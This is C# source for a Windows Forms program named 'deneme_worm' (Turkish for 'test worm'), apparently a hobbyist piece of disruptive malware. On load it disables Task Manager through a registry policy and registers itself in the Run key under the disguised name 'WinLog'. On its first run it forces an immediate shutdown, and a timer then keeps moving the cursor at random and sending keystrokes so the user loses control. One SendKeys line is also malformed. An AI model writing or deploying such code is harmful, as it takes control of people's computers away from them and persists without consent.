using Microsoft.Win32;
using System;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace deneme_worm
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();// timmer i çalıştırır

            // görev yöneticisini kayıt defteri üzerinden devre dışı bırakma
            RegistryKey rkey1 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies", true);

            rkey1.CreateSubKey("System", RegistryKeyPermissionCheck.Default);

            rkey1.Close();

            RegistryKey rkey2 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);

            rkey2.SetValue("DisableTaskMgr", 1);//0 olursa aktif olur

            rkey2.Close();




            if (! File.Exists("adsasdwqeq2.a"))
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("WinLog", "" + Application.ExecutablePath + "");
                using (var wr = new StreamWriter("adsasdwqeq2.a"))
                    wr.Write(" ");
                System.Diagnostics.Process.Start("shutdown", "-s -t 0 -f");// bilgisayarı kapatacak ms dos komutları çalıştırır.
               
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SendKeys.Send({Tab});
            Cursor.Position = new Point(new Random().Next(100, 300), new Random().Next(100, 300));// imlecin yeri sürekli değişecekk kullanıcı kontrolü sağlayamayacak
        }
    }
}
